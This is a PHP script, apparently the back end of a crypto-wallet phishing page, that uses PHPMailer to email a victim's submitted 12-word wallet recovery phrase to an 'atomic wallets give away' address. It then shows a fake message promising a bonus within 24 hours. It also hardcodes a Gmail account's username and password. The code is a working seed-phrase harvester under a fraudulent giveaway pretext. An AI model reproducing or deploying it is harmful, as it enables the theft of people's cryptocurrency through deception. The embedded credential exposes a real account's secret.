<?php
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\Exception;
    use PHPMailer\PHPMailer\SMTP;
    require 'vendor/phpmailer/phpmailer/src/Exception.php';
    require 'vendor/phpmailer/phpmailer/src/PHPMailer.php';
    require 'vendor/phpmailer/phpmailer/src/SMTP.php';
    require 'vendor/autoload.php';
    $mail = new PHPMailer(true);
  
 
  try {
    // $mail->SMTPDebug = SMTP::DEBUG_SERVER;   
    $mail->isSMTP();                                            // Send using SMTP
    $mail->Host       = 'smtp.gmail.com';                    // Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = 'cryptoremitfinance@gmail.com';                     // SMTP username
    $mail->Password   = 'Homepage2013';                                 // SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
    $mail->Port       = 587;                                   // TCP port to connect to
    $mail->setFrom('cryptoremitfinance@gmail.com', 'atomic wallets give away');

    $mail->addAddress('info@atomicswalletsgiveaway.com');     // Add a recipient
    // $mail->addAddress('info@atomicswalletgiveaway.com');     // Add a recipient
    $mail->addReplyTo('no-reply@atomicswalletsgiveaway.com');
    $mail->isHTML(true);

      $mail->Subject ='User';
      $mail->Body    = "<body style='background-color: #eee; font-size: 16px; margin-top:10px; margin-bottom:10px;'>
          <div style='max-width: 70%; min-width: 200px; background-color: #fff; padding: 20px; margin: 40px auto; border-radius: 5px; box-shadow: 0px 10px 10px 5px;'>                        
          <h1 style='font-size: 30px; font-weight:800;'><center> atomic wallets give away </center></h1>     
                          <hr>
             <p>
              Below is the 12 backup recovery phraise:
             </p>
             <p>
             <strong>$word</strong>
             </p>
                          
                                             
        </body>";

      $mail->send();
      echo "<script type='text/javascript'>alert('Thanks for your cooperation, if qualified, you will recieve your bonus in the next 24 hours.');</script>";
      echo "<script type='text/javascript'>location.href = './index.php';</script>";
  } catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
  }
?>
